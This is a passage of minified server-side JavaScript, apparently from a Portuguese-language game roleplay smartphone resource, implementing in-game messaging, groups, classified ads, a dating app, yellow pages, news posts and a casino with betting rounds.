    if (!a || !i) return !1; {
        let n = {};
        n.user_id = a, n.phone = r;
        let s = {};
        return s.user_id = i, s.phone = t, pF.phone_blocks.where(t => t.where(n)).orWhere(t => t.where(s)).exists()
    }
}, 1e4);
pL.wpp_sendMessage = async (t, r, a, i = "text", n = null) => {
    let s = await pp.getUserId(t),
        o = pG[s],
        l = r.startsWith("group") && rl.cache.groups.find(t => t.id == r.substr(5));
    if (p0(t)) return {};
    if (a.length > 255) {
        let p = {
            error: "Mensagem muito grande"
        };
        return p
    }
    if (await rn(o, r)) {
        let d = {
            error: "Voc\xea n\xe3o consegue enviar mensagem para este n\xfamero"
        };
        return d
    }
    let u = l ? l.channelId : await rl.getChannel(o, r),
        c = {
            sender: o,
            channel_id: u,
            content: a.startsWith("https://cdn.discordapp.com") ? a + ".webm" : a,
            created_at: oT()
        };
    if ("image" === i ? (n.startsWith("https://cdn.discordapp.com/attachments/") && (n = n.replace("https://cdn.discordapp.com/attachments/", "https://media.discordapp.net/attachments/")), c.image = n) : "location" === i && Array.isArray(n) && 3 === n.length && (c.location = JSON.stringify(n)), c.id = await rl.messages.insert(c).returnKeys(), c.id) {
        if (emit("smartphone:whatsapp_message", c), l) {
            let h = {};
            h.id = l.id, h.name = l.name, c.group = h, l.pusher("WHATSAPP_MESSAGE", c)
        } else c.target = r, oS(t, "WHATSAPP_MESSAGE", c), pP(r).then(r => {
            t != r && oS(r, "WHATSAPP_MESSAGE", c)
        });
        return {}
    }
};
const ro = p3((...t) => rl.profiles.whereIn("owner", t).where("read_receipts", 0).exists(), 1e4);
pL.wpp_markAsRead = async (t, r) => {
    let a = await pp.getUserId(t),
        i = pG[a],
        n = await ro(r, i),
        s = await rl.getChannel(r, i),
        o = {
            readed: 0
        };
    o.sender = r, o.channel_id = s;
    let l = {
        readed: 1
    };
    if (n) return void await rl.messages.where(o).update(l);
    let p = {
        saw_at: 0
    };
    p.sender = r, p.channel_id = s, await rl.messages.where(p).update({
        saw_at: oT(),
        readed: 1
    });
    let d = pH[r];
    if (d) {
        let u = await pM(d);
        u && oS(u, "WHATSAPP_READ", i)
    }
}, pL.wpp_getProfile = async t => {
    let r = await pp.getUserId(t),
        a = pG[r],
        i = {};
    i.owner = a;
    let n = await rl.profiles.where(i).first();
    if (!n) {
        let s = {};
        s.owner = a, await rl.profiles.insert(n = s)
    }
    return n
}, pL.wpp_updateAvatar = async (t, r) => {
    let a = await pp.getUserId(t),
        i = pG[a],
        n = {};
    n.owner = i;
    let s = {};
    s.avatarURL = r, await rl.profiles.where(n).update(s);
    let o = {};
    o.phone = i, o.avatarURL = r, oS(-1, "WHATSAPP_AVATAR", o)
}, exports("getWhatsappAvatar", t => {
    let r = {};
    return r.owner = t, rl.profiles.where(r).first().pluck("avatarURL")
}), pL.wpp_updateSettings = async (t, r) => {
    let a = await pp.getUserId(t),
        i = pG[a],
        n = {};
    n.owner = i;
    let s = {};
    s.read_receipts = r, await rl.profiles.where(n).update(s)
}, pL.wpp_getResume = async t => {
    let r = await pp.getUserId(t),
        a = pG[r],
        i = rl.cache.groups.filter(t => t.owner == a || t.members.includes(a)),
        n = await pF.contacts.where("owner", a).pluck("phone"),
        s = await rl.profiles.whereIn("owner", n).pluck("avatarURL", "owner"),
        o = {};
    o.sender = a;
    let l = {};
    l.target = a;
    let p = await rl.channels.where(o).orWhere(l),
        d = await pc.query("select m1.* from smartphone_whatsapp_messages m1 \n  left outer join smartphone_whatsapp_messages m2 \n  on (m1.id<m2.id and m1.channel_id=m2.channel_id)\n  left join smartphone_whatsapp_channels ch on ch.id=m1.channel_id\n  where m2.id is null AND (ch.sender=? or ch.target=?)\n  and (m1.deleted_by is null or m1.deleted_by!=?)", [a, a, a]);
    for (let u of d)
        if (u.sender != a) u.target = a;
        else {
            let c = p.find(t => t.id == u.channel_id);
            u.target = c.sender == a ? c.target : c.sender
        } let h = (await pc.query("select channel_id,COUNT(*) as qtd from smartphone_whatsapp_messages msg\n  left join smartphone_whatsapp_channels ch on msg.channel_id=ch.id\n  where (ch.sender=? or ch.target=?) and msg.readed=0 and msg.sender!=?", [a, a, a])).pluckBy("qtd", "channel_id"),
        f = {};
    return f.groups = i, f.messages = d, f.unread = h, f.avatars = s, f
}, pL.wpp_getChat = async (t, r) => {
    let a = await pp.getUserId(t),
        i = pG[a];
    if (r.startsWith("group")) {
        let n = rl.cache.groups.find(t => t.id == r.slice(5));
        if (!n || n.owner != i && !n.members.includes(i)) {
            let s = {
                error: "Grupo n\xe3o encontrado"
            };
            return s
        }
        let o = {};
        o.channel_id = n.channelId;
        let l = await rl.messages.where(o).limit(125).orderBy("id", "DESC");
        l.sort((t, r) => t.id - r.id);
        let p = {};
        return p.name = n.name, p.id = n.channelId, p.avatarURL = n.avatarURL, p.messages = l, p
    } {
        let d = await rl.getChannel(i, r),
            u = {};
        u.id = d;
        let c = u,
            h = {};
        h.channel_id = d, c.messages = await rl.messages.where(t => {
            t.whereNull("deleted_by").orWhere("deleted_by", "!=", i)
        }).where(h).limit(125).orderBy("id", "DESC") || [], c.messages.sort((t, r) => t.id - r.id);
        let f = {};
        return f.owner = r, c.avatarURL = await rl.profiles.where(f).first().pluck("avatarURL"), c
    }
}, pL.wpp_getAvatar = async (t, r) => {
    let a = {};
    return a.owner = r, rl.profiles.where(a).first().pluck("avatarURL")
}, pL.wpp_deleteMessages = async (t, r) => {
    let a = await pp.getUserId(t),
        i = pG[a],
        n = "smartphone_whatsapp_messages";
    if (r && !r.startsWith("group")) {
        let s = await rl.getChannel(i, r);
        await pc.query("DELETE FROM " + n + " WHERE channel_id=?\n    AND deleted_by IS NOT NULL AND deleted_by != ?", [s, i]), await pc.query("UPDATE " + n + " SET deleted_by=? WHERE channel_id=?", [i, s])
    } else await pc.query("DELETE msg FROM " + n + " msg\n    LEFT JOIN smartphone_whatsapp_channels ch ON msg.channel_id=ch.id\n    WHERE (ch.sender = ? OR ch.target = ?)\n    AND deleted_by IS NOT NULL AND deleted_by != ?", [i, i, i]), await pc.query("UPDATE " + n + " msg\n    LEFT JOIN smartphone_whatsapp_channels ch ON msg.channel_id=ch.id\n    SET deleted_by=? WHERE (ch.sender = ? OR ch.target = ?)\n    AND deleted_by IS NULL", [i, i, i]);
    return !0
}, pL.wpp_getGroup = async (t, r) => {
    let a = await pp.getUserId(t),
        i = pG[a],
        n = rl.cache.groups.find(t => t.id == r);
    if (n) {
        if (n.owner === i || n.members.includes(i)) {
            let s = {
                ...n
            };
            return s.isOwner = n.owner === i, s
        } {
            let o = {
                error: "Voc\xea n\xe3o \xe9 o dono do grupo"
            };
            return o
        }
    } {
        let l = {
            error: "Grupo n\xe3o encontrado"
        };
        return l
    }
}, pL.wpp_promote = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = pG[i],
        s = rl.cache.groups.find(t => t.id == r);
    if (s.owner === n) {
        let o = s.members.indexOf(a);
        if (o >= 0) s.members.splice(o, 1, n), s.owner = a, s.update(["owner", "members"]);
        else {
            let l = {
                error: "Este n\xfamero n\xe3o faz parte do grupo"
            };
            return l
        }
    } else {
        let p = {
            error: "Sem permiss\xe3o"
        };
        return p
    }
}, pL.wpp_inviteToGroup = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = pG[i],
        s = rl.cache.groups.find(t => t.id == r);
    if (s) {
        if (s.owner === n) {
            if (s.members.includes(a)) {
                let o = {
                    error: "Este n\xfamero j\xe1 est\xe1 no grupo"
                };
                return o
            }
            if (s.members.length >= rm.MAX_MEMBERS - 1) {
                let l = {
                    error: "O grupo est\xe1 cheio"
                };
                return l
            }
            if (await pF.getIdentityByPhone(a)) {
                s.members.push(a), s.update(["members"]);
                let p = pI[a];
                p && oS(p, "WHATSAPP_GROUP", s)
            } else {
                let d = {
                    error: "N\xfamero n\xe3o encontrado"
                };
                return d
            }
        } else {
            let u = {
                error: "Voc\xea n\xe3o \xe9 o dono do grupo"
            };
            return u
        }
    } else {
        let c = {
            error: "Grupo n\xe3o encontrado"
        };
        return c
    }
}, pL.wpp_removeFromGroup = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = pG[i],
        s = rl.cache.groups.find(t => t.id == r);
    if (s) {
        if (s.owner === n) {
            let o = s.members.indexOf(a);
            if (-1 === o) {
                let l = {
                    error: "Este n\xfamero n\xe3o faz parte do grupo"
                };
                return l
            } {
                s.members.splice(o, 1), s.update(["members"]);
                let p = pI[a],
                    d = {};
                d.id = s.id, d.name = s.name, p && oS(p, "WHATSAPP_GROUP_KICK", d)
            }
        } else {
            let u = {
                error: "Voc\xea n\xe3o \xe9 o dono do grupo"
            };
            return u
        }
    } else {
        let c = {
            error: "Grupo n\xe3o encontrado"
        };
        return c
    }
}, pL.wpp_leaveGroup = async (t, r) => {
    let a = await pp.getUserId(t),
        i = pG[a],
        n = rl.cache.groups.find(t => t.id == r);
    if (n) {
        if (n.owner === i) {
            let s = {
                error: "Voc\xea n\xe3o pode sair do grupo sendo dono"
            };
            return s
        }
        if (n.members.includes(i)) {
            let o = n.members.indexOf(i);
            n.members.splice(o, 1), n.update(["members"]), oS(t, "WHATSAPP_LEAVE_GROUP", n.id)
        } else {
            let l = {
                error: "Voc\xea n\xe3o \xe9 o dono do grupo"
            };
            return l
        }
    } else {
        let p = {
            error: "Grupo n\xe3o encontrado"
        };
        return p
    }
}, pL.wpp_createGroup = async (t, r, a, i) => {
    let n = await pp.getUserId(t),
        s = pG[n],
        o = {
            name: r,
            owner: s,
            avatarURL: a,
            members: JSON.stringify(i),
            created_at: oT()
        };
    if (o.id = await rl.groups.insert(o).returnKeys(), !o.id) return;
    o.members = i;
    let l = new rm(o);
    rl.cache.groups.push(l), l.pusher("WHATSAPP_GROUP", l)
}, pL.wpp_updateGroupAvatar = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = pG[i],
        s = rl.cache.groups.find(t => t.id === r);
    if (s) {
        if (s.owner != n) {
            let o = {
                error: "Voc\xea n\xe3o \xe9 o dono do grupo"
            };
            return o
        } {
            s.avatarURL = a, s.update(["avatarURL"]);
            let l = {};
            l.id = r, l.avatarURL = a, s.pusher("WHATSAPP_GROUP_PHOTO", l)
        }
    } else {
        let p = {
            error: "Grupo n\xe3o encontrado"
        };
        return p
    }
}, pL.wpp_updateGroupName = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = pG[i],
        s = rl.cache.groups.find(t => t.id === r);
    if (s) {
        if (s.owner != n) {
            let o = {
                error: "Voc\xea n\xe3o \xe9 o dono do grupo"
            };
            return o
        } {
            s.name = a, s.update(["name"]);
            let l = {};
            l.id = r, l.name = a, s.pusher("WHATSAPP_GROUP_NAME", l)
        }
    } else {
        let p = {
            error: "Grupo n\xe3o encontrado"
        };
        return p
    }
}, pL.wpp_deleteGroup = async (t, r) => {
    let a = await pp.getUserId(t),
        i = pG[a],
        n = rl.cache.groups.find(t => t.id == r);
    if (n) {
        if (n.owner != i) {
            let s = {
                error: "Voc\xea n\xe3o \xe9 o dono do grupo"
            };
            return s
        } {
            let o = {};
            o.id = r, await rl.groups.where(o).delete();
            let l = {};
            l.channel_id = n.channelId, await rl.messages.where(l).delete(), n.pusher("WHATSAPP_GROUP_DESTROY", {
                id: n.id,
                name: n.name
            });
            let p = rl.cache.groups.indexOf(n);
            rl.cache.groups.splice(p, 1)
        }
    } else {
        let d = {
            error: "Grupo n\xe3o encontrado"
        };
        return d
    }
};
const rp = {
    __proto__: null
};
var rq = Object.freeze(rp);
const rr = {
    get ads() {
        return pc("smartphone_olx")
    }
};
pF.ready(async t => {
    t.includes(rr.ads.table) || (await rr.ads.create(t => {
        t.id(), t.int("user_id"), t.varchar("title"), t.varchar("category"), t.int("price"), t.varchar("description", 1024), t.varchar("images", 1024), t.bigint("created_at")
    }), await rr.ads.createIndex("user_id"))
}), pL.olx_search = async (t, r, a) => {
    let i = await rr.ads.where("title", "LIKE", r).where("category", "LIKE", a).orderBy("id", "DESC").limit(50),
        n = await pF.getIdentitiesBy("user_id", i.pluck("user_id").unique());
    for (let s of i) s.images = JSON.parse(s.images), s.author = n.find(t => t.user_id == s.user_id);
    return i
}, pL.olx_fetch = async (t, r) => {
    let a = {};
    a.id = r;
    let i = await rr.ads.where(a).first();
    return i && (i.images = JSON.parse(i.images)), i && (i.author = await pF.getIdentityByUserId(i.user_id)), i
}, pL.olx_createAd = async (t, r) => {
    let a = await pp.getUserId(t);
    if (p0(t, "olx", 1)) return;
    let i = {
        error: "T\xedtulo inv\xe1lido"
    };
    if (!r.title || r.title.length > 1024) return i;
    let n = {
        error: "A categoria \xe9 obrigat\xf3ria"
    };
    if (!r.category) return n;
    let s = {
        error: "A descri\xe7\xe3o \xe9 obrigat\xf3ria"
    };
    if (!r.description) return s;
    let o = {
        error: "Valor inv\xe1lido"
    };
    if (!Number.isInteger(r.price) || r.price <= 0) return o;
    let l = {
        error: "A imagem \xe9 obrigat\xf3ria"
    };
    if (!Array.isArray(r.images) || 0 == r.images.length) return l;
    let p = {
        error: "O m\xe1ximo de imagens \xe9 3"
    };
    return r.images.length > 3 ? p : (delete r.id, r.user_id = a, r.images = JSON.stringify(r.images), r.created_at = oT(), r.id = await rr.ads.insert(r), r)
}, pL.olx_dashboard = async t => {
    let r = await pp.getUserId(t),
        a = {};
    a.user_id = r;
    let i = await rr.ads.where(a).limit(50);
    return i.forEach(t => t.images = JSON.parse(t.images)), i
}, pL.olx_destroy = async (t, r) => {
    let a = await pp.getUserId(t),
        i = {
            error: "?"
        };
    if (!r) return i;
    let n = await rr.ads.where("id", r).first();
    if (n && (n.user_id == a || await pK(a))) {
        pz.deleteManyImages(...JSON.parse(n.images));
        let s = {};
        s.id = r, await rr.ads.where(s).delete();
        let o = {};
        o.ID = a, o.ANUNCIO = n.title, o["ID DO ANUNCIO"] = n.id, o["DONO DO ANUNCIO"] = n.user_id;
        let l = {
            name: "OLX"
        };
        l.content = o, qf(l)
    }
};
const rs = {
    __proto__: null
};
var rt = Object.freeze(rs);
const ru = {
    get profiles() {
        return pc("smartphone_tinder")
    },
    get rating() {
        return pc("smartphone_tinder_rating")
    },
    get messages() {
        return pc("smartphone_tinder_messages")
    },
    users: {}
};

function rv(t) {
    for (let r in ru.users)
        if (ru.users[r] && ru.users[r].id == t) return pM(parseInt(r));
    return Promise.resolve()
}

function rw(t) {
    let r = "All" == t.target ? ["Male", "Female"] : [t.target];
    return ru.profiles.whereIn("gender", r).whereIn("target", ["All", t.gender]).where("id", "!=", t.id)
}
pF.ready(async t => {
    let {
        profiles: r,
        rating: a,
        messages: i
    } = ru;
    t.includes(r.table) || (await r.create(t => {
        t.id(), t.int("user_id"), t.varchar("name"), t.varchar("image"), t.varchar("bio", 1024), t.tinyint("age"), t.varchar("gender", 50), t.tinyint("show_gender"), t.varchar("tags"), t.tinyint("show_tags"), t.varchar("target", 100)
    }), await r.createIndex("user_id"), await r.createIndex("gender"), await r.createIndex("target")), t.includes(a.table) || await a.create(t => {
        t.int("profile_id").primary(), t.int("rated_id").primary(), t.tinyint("rating").default(0)
    }), t.includes(i.table) || (await i.create(t => {
        t.id(), t.int("sender"), t.int("target"), t.varchar("content"), t.tinyint("liked").default(0), t.bigint("created_at")
    }), await i.createIndex("sender"), await i.createIndex("target"))
}), pL.tinder = async t => {
    let r = await pp.getUserId(t),
        a = {};
    a.user_id = r;
    let i = await ru.profiles.where(a).first();
    return ru.users[r] = i, i && ry.modify([i.id], () => i), i
}, pL.tinder_register = async (t, r) => {
    let a = await pp.getUserId(t);
    delete r.id, r.user_id = a, r.tags = JSON.stringify(r.tags), await ru.profiles.insert(r)
}, pL.tinder_changeAvatar = async (t, r) => {
    let a = await pp.getUserId(t),
        i = {};
    i.image = r, await ru.profiles.where("user_id", a).update(i)
}, pL.tinder_changeBio = async (t, r) => {
    if (!r || r.length > 1024) return;
    let a = await pp.getUserId(t),
        i = {};
    i.bio = r, await ru.profiles.where("user_id", a).update(i)
}, pL.tinder_changeTarget = async (t, r) => {
    let a = await pp.getUserId(t),
        i = {};
    i.target = r, await ru.profiles.where("user_id", a).update(i)
}, pL.tinder_next = async (t, r, a, i) => {
    let n = await pp.getUserId(t),
        s = ru.users[n];
    if (!s) return;
    let o = await ru.rating.where("profile_id", s.id).select("rated_id", "rating"),
        l = o.filter(t => 0 != t.rating).pluck("rated_id"),
        p = rw(s),
        d;
    if (0 === r) d = await p.whereNotIn("id", o.pluck("rated_id")).first();
    else if (a) {
        let u = {};
        u.profile_id = s.id, u.rated_id = r, u.rating = i, await ru.rating.replace(u);
        let c = {};
        if (c.profile_id = r, c.rated_id = s.id, 0 != i && await ru.rating.where(c).where("rating", ">", 0).exists()) {
            let h = await ry(r);
            if (h) {
                let f = {};
                f.name = h.name;
                let m = {};
                m.profile = f, oS(t, "TINDER_MATCH", m), rx.modify([h.id], t => t && t.push(s) && t);
                let w = await pP(h.user_id),
                    g = {};
                g.name = s.name;
                let y = {};
                y.profile = g, w && oS(w, "TINDER_MATCH", y)
            }
        }
        d = await p.where("id", ">", r).whereNotIn("id", l).first()
    } else d = await p.where("id", "<", r).whereNotIn("id", l).orderBy("id", "DESC").first();
    return d && (d.tags = JSON.parse(d.tags), d.online = Number.isInteger(await pM(d.user_id)), d.previous = await rw(s).where("id", "<", d.id).whereNotIn("id", l).exists()), d
}, pL.tinder_liked = p3(async t => {
    let r = await pp.getUserId(t),
        a = ru.users[r];
    if (!a) return [];
    let i = await ru.rating.where("rated_id", a.id).where("rating", ">", 0).pluck("profile_id"),
        n = await ru.profiles.whereIn("id", i);
    return n
}, 15e3);
const rx = p3(async t => {
    let r = await ru.rating.where("profile_id", t).where("rating", ">", 0).pluck("rated_id"),
        a = await ru.rating.where("rated_id", t).where("rating", ">", 0).pluck("profile_id"),
        i = r.filter(t => a.includes(t)),
        n = await ru.profiles.whereIn("id", i),
        s = {};
    s.sender = t, s.target = t;
    let o = await ru.messages.select(pc.raw("MAX(id) as id")).where(t => t.orWhere(s)).groupBy("sender", "target").pluck("id"),
        l = (await ru.messages.whereIn("id", o)).filter((t, r, a) => {
            let i = a.find(r => r.sender == t.target && r.target == t.sender);
            return !i || i.id < t.id
        });
    for (let p of n) p.last_message = l.find(r => r.sender == t && r.target == p.id || r.sender == p.id && r.target == t);
    return n
}, 6e4);
pL.tinder_matches = async t => {
    let r = await pp.getUserId(t),
        a = ru.users[r];
    return a && rx(a.id)
};
const ry = p3(t => {
    for (let r of Object.values(ru.users))
        if (r && r.id == t) return r;
    return ru.profiles.where("id", t).first()
}, 3e4);
pL.tinder_chat = async (t, r) => {
    let a = await pp.getUserId(t),
        i = ru.users[a],
        n = await ry(r);
    if (!i || !n) return;
    let s = i.id;
    n.avatars = {
        [i.id]: i.image,
        [n.id]: n.image
    };
    let o = {};
    o.sender = s, o.target = r;
    let l = {};
    return l.sender = r, l.target = s, n.messages = await ru.messages.where(t => t.where(o)).orWhere(t => t.where(l)).orderBy("id", "DESC").limit(100), n.messages.sort((t, r) => t.id - r.id), n
}, pL.tinder_dismatch = async (t, r) => {
    let a = await pp.getUserId(t),
        i = ru.users[a];
    if (!i) return;
    let n = {
        rating: 0
    };
    n.profile_id = i.id, n.rated_id = r, await ru.rating.replace(n);
    let s = {};
    s.sender = i.id, s.target = r;
    let o = {};
    o.sender = r, o.target = i.id, await ru.messages.where(t => t.where(s)).orWhere(t => t.where(o)).delete();
    let l = await rv(r);
    l && oS(l, "TINDER_DISMATCH", i.id)
}, pL.tinder_delete = async t => {
    let r = await pp.getUserId(t),
        a = ru.users[r];
    a && (await ru.messages.where("sender", a.id).orWhere("target", a.id).delete(), await ru.rating.where("profile_id", a.id).orWhere("rated_id", a.id).delete(), await ru.profiles.destroy(a.id), delete ru.users[r])
}, pL.tinder_sendMessage = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = ru.users[i];
    if (p0(t) || !n) return;
    let s = await ry(r);
    if (!s) return;
    let o = {
        sender: n.id,
        target: r,
        content: a,
        created_at: oT()
    };
    if (o.id = await ru.messages.insert(o).returnKeys(), !o.id) return;
    o.sender_name = n.name, o.sender_uid = i, oS(t, "TINDER_MESSAGE", o);
    let l = [n.id, s.id];
    l.forEach(t => rx.modify([t], t => (t && t.forEach(t => {
        l.includes(t.id) && (t.last_message = o, t.image = t.id == s.id ? s.image : n.image)
    }), t)));
    let p = await pP(s.user_id);
    p && oS(p, "TINDER_MESSAGE", o)
}, pL.tinder_likeMessage = async (t, r) => {
    let a = await pp.getUserId(t),
        i = ru.users[a];
    if (!i) return;
    let n = await ru.messages.where("id", r).where("target", i.id).first();
    if (!n) return;
    let s = {
        liked: 1
    };
    await ru.messages.where("id", r).update(s), oS(t, "TINDER_LIKE", r);
    let o = await rv(n.sender);
    o && oS(o, "TINDER_LIKE", r)
}, on("quantum:playerLeave", t => delete ru.users[t]);
const rz = {
    __proto__: null
};
var rA = Object.freeze(rz);
const rB = [];
pL.yellowpages_index = () => rB, pL.yellowpages_store = async (t, r) => {
    let a = await pp.getUserId(t),
        i = pG[a];
    if (r && r.length <= 100) {
        let n = rB.find(t => t.author.user_id == a);
        if (n) n.title = r, global.emit("smartphone:yellowpages-update", n);
        else {
            let s = await pF.getName(a),
                o = {};
            o.user_id = a, o.name = s, o.phone = i;
            let l = {};
            l.author = o, l.title = r;
            let p = l;
            rB.unshift(p), global.emit("smartphone:yellowpages", p)
        }
    }
}, pL.yellowpages_destroy = async t => {
    let r = await pp.getUserId(t),
        a = rB.findIndex(t => t.author.user_id == r);
    a >= 0 && rB.splice(a, 1), global.emit("smartphone:yellowpages-destroy", r)
}, on("quantum:playerLeave", t => {
    let r = rB.findIndex(r => r.author.user_id == t);
    r >= 0 && rB.splice(r, 1)
});
const rC = {
    __proto__: null
};
var rD = Object.freeze(rC);

function rE() {
    return pc("smartphone_weazel")
}
const rF = {};
pF.ready(async t => {
    t.includes("smartphone_weazel") || await rE().create(t => {
        t.id(), t.int("user_id"), t.varchar("author"), t.varchar("tag"), t.varchar("title"), t.varchar("description", 4096), t.varchar("imageURL").nullable(), t.varchar("videoURL").nullable(), t.int("views").default(0), t.int("created_at")
    }), Object.assign(pL, rF)
});
const rG = ["author", "tag", "title", "description", "imageURL", "videoURL"];
async function rH(t, r) {
    if (await pE(t, pB.exclusive?.weazel?.permission)) {
        if (r.author) {
            if (r.title) {
                if (r.description) {
                    if (!r.tag) throw new p8("Insira a categoria da not\xedcia")
                } else throw new p8("Insira a descri\xe7\xe3o da not\xedcia")
            } else throw new p8("Insira o t\xedtulo da not\xedcia")
        } else throw new p8("Insira o nome do Autor")
    } else throw new p8("Sem permiss\xe3o");
    return oW(r, ...rG)
}
rF.weazel_index = () => rE().orderBy("created_at", "DESC").limit(20), rF.weazel_tag = (t, r) => rE().where("tag", String(r)).orderBy("created_at", "DESC").limit(20), rF.weazel_publish = async (t, r) => {
    let a = await pp.getUserId(t),
        i = await rH(a, r);
    i.user_id = a, i.views = 0, i.created_at = oT(), i.id = await rE().insert(i).returnKeys(), global.emit("smartphone:weazel", i), i.description.length > 120 && (i.description = i.description.substring(0, 120) + "..."), oS(-1, "WEAZEL", i)
};
const rI = {};
rF.weazel_view = async (t, r) => {
    let a = await pp.getUserId(t),
        i = await rE().find(r);
    if (!i) return null;
    let n = r + "-" + a;
    if (!rI[n]) {
        rI[n] = !0;
        let s = {};
        s.id = r, await rE().update().where(s).increment("views", 1)
    }
    return i
}, rF.weazel_destroy = async (t, r) => {
    let a = await pp.getUserId(t),
        i = await pE(a, pB.exclusive.weazel.permission);
    if (i) {
        let n = await rE().find(r);
        n && (await rE().destroy(r), oS(-1, "WEAZEL_DESTROY", r), qf({
            name: "Weazel - Not\xedcia exclu\xedda",
            avatar: "weazel",
            content: {
                PASSAPORTE: a,
                NOTICIA: n.title,
                CATEGORIA: n.tag,
                DESCRICAO: n.description.substring(0, 256),
                IMAGEM: n.imageURL,
                VIDEO: n.videoURL
            }
        }))
    }
}, rF.weazel_update = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = await rH(i, a),
        s = await rE().find(r);
    if (!s) {
        let o = {
            error: "Not\xedcia n\xe3o encontrada"
        };
        return o
    }
    let l = {};
    l.id = r, await rE().where(l).update(n), qf({
        name: "Weazel - Not\xedcia atualizada",
        avatar: "weazel",
        content: {
            PASSAPORTE: i,
            NOTICIA: s.title + " -> " + n.title,
            CATEGORIA: s.tag + " -> " + n.tag,
            DESCRICAO: s.description.substring(0, 256) + " -> " + n.description.substring(0, 256),
            IMAGEM: (s.imageURL + " -> " + n.imageURL).replace(/null|undefined/g, "N/A"),
            VIDEO: (s.videoURL + " -> " + n.videoURL).replace(/null|undefined/g, "N/A")
        }
    })
}, rF.weazel_check = async t => {
    let r = await pp.getUserId(t);
    return pE(r, pB.exclusive.weazel.permission)
}, rF.weazel_tags = () => pB.exclusive.weazel.tags;
const rJ = {
    __proto__: null
};
var rK = Object.freeze(rJ);
const rL = () => pc("smartphone_casino");
let rM = p4(pB, "exclusive", "casino", "maxBet") || 1 / 0;

function rN(t) {
    return pB.exclusive?.casino?.custom ? pp.getCasinoMoney(t) : pp.getBankMoney(t)
}

function rO(t, r) {
    return pB.exclusive?.casino?.custom ? pp.setCasinoMoney(t, r) : pp.setBankMoney(t, r)
}
const rP = {};
pF.ready(async t => {
    let r = rL();
    t.includes(r.table) || await r.create(t => {
        t.int("user_id").primary(), t.bigint("balance").default(0), t.bigint("double").default(0), t.bigint("crash").default(0), t.bigint("mine").default(0)
    }), Object.assign(pL, rP)
});
const rQ = {};
async function rR(t) {
    if (!Number.isSafeInteger(t)) return 0;
    if (t in rQ) return rQ[t];
    let r = {};
    r.user_id = t;
    let a = await rL().where(r).first().select("balance");
    if (!a) {
        let i = {};
        return i.user_id = t, await rL().insert(i), rQ[t] = 0
    }
    return rQ[t] = a.balance
}
async function rS(t, r) {
    rQ[t] = r;
    let a = {};
    a.user_id = t;
    let i = {};
    i.balance = r, await rL().where(a).update(i)
}
async function rT(t, r) {
    let a = await rR(t);
    await rS(t, a + r)
}
const rU = new Set;

function rV(t, r) {
    rU.forEach(a => oS(a, t, r))
}
rP.casino_subscribe = t => rU.add(t), rP.casino_unsubscribe = t => rU.delete(t), rP.casino_balance = async t => {
    let r = await pp.getUserId(t);
    return rR(r)
}, rP.casino_deposit = async (t, r) => {
    let a = await pp.getUserId(t);
    if (!Number.isSafeInteger(a) || !parseInt(r) || r <= 0) return;
    let i = await rN(a),
        n = await rR(a);
    if (i >= r) {
        let s = {};
        s.PASSAPORTE = a, s.VALOR = r, s.SALDO = n + " -> " + (n + r);
        let o = {
            name: "Casino - Dep\xf3sito",
            avatar: "casino"
        };
        return o.content = s, qf(o), await rO(a, i - r), await rS(a, n + r), !0
    }
    return !1
}, rP.casino_withdraw = async (t, r) => {
    let a = await pp.getUserId(t);
    if (!Number.isSafeInteger(a) || !parseInt(r) || r <= 0) return;
    let i = await rN(a),
        n = await rR(a);
    if (n >= r) {
        let s = {};
        s.PASSAPORTE = a, s.VALOR = r, s.SALDO = n + " -> " + (n - r);
        let o = {
            name: "Casino - Saque",
            avatar: "casino"
        };
        return o.content = s, qf(o), await rO(a, i + r), await rS(a, n - r), !0
    }
    return !1
};
class rW {
    constructor() {
        this.refresh()
    }
    get delay() {
        return this.rolling ? rY.endAt - Date.now() : rY.startAt - Date.now()
    }
    addBet(t, r, a) {
        this.startAt || (this.startAt = Date.now() + 15e3, setTimeout(() => this.roll(), 15500));
        let i = {};
        i.user_id = t, i.color = r, i.amount = a, this.bets.push(i), this.aggregate[r][0] += 1, this.aggregate[r][1] += a;
        let n = {};
        n.color = r, n.amount = a, rV("CASINO_DOUBLE_BET", n)
    }
    getBets(t) {
        return this.bets.reduce((r, a) => r + (a.user_id == t ? a.amount : 0), 0)
    }
    roll() {
        this.rolling = !0, this.endAt = Date.now() + 15e3, this.result = Math.floor(15 * Math.random()), 0 == this.result && "white" == rW.last.at(-1) && (this.result = Math.floor(15 * Math.random())), rV("CASINO_DOUBLE", this.result), setTimeout(() => {
            rV("CASINO_DOUBLE_RESET"), this.refresh()
        }, 15500);
        let t = 0 == this.result ? "white" : this.result > 7 ? "black" : "red";
        rW.last.push(t) > 10 && rW.last.shift();
        let r = {};
        for (let a of this.bets.pluck("user_id").unique()) {
            let i = 0,
                n = 0;
            for (let s of this.bets) s.user_id == a && (n -= s.amount, s.color == t && (i += rW.multipliers[t] * s.amount));
            n += i;
            let o = i + ":" + n;
            o in r ? r[o].push(a) : r[o] = [a]
        }
        Object.entries(r).forEach(async ([t, r]) => {
            let [a, i] = t.split(":");
            for (let n of (await rL().update().whereIn("user_id", r).increment("double", i).increment("balance", a), r)) n in rQ && (rQ[n] += parseInt(a))
        })
    }
    refresh() {
        this.bets = [];
        let t = {};
        t.red = [0, 0], t.black = [0, 0], t.white = [0, 0], this.aggregate = t, this.rolling = !1, this.startAt = null, this.endAt = null
    }
}
rW.last = Array(10).fill("").map(() => {
    let t = Math.floor(15 * Math.random());
    return 0 == t ? "white" : t > 7 ? "black" : "red"
});
const rX = {
    white: 14,
    red: 2,
    black: 2
};
rW.multipliers = rX;
const rY = new rW;
rP.casino_double = () => {
    let t = rW.last;
    if (rY.rolling) {
        let r = {
            status: "rolling"
        };
        return r.last = t, r.result = rY.result, r.delay = rY.delay, r
    }
    if (rY.startAt) {
        let a = {
            status: "bet"
        };
        return a.last = t, a.aggregate = rY.aggregate, a.delay = rY.delay, a
    }
    let i = {
        status: "waiting"
    };
    return i.last = t, i
}, rP.casino_double_bet = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = {
            error: "Voc\xea est\xe1 bugado"
        };
    if (!Number.isSafeInteger(i)) return n;
    if (!(a = parseInt(a)) || a <= 0) {
        let s = {
            error: "Valor inv\xe1lido"
        };
        return s
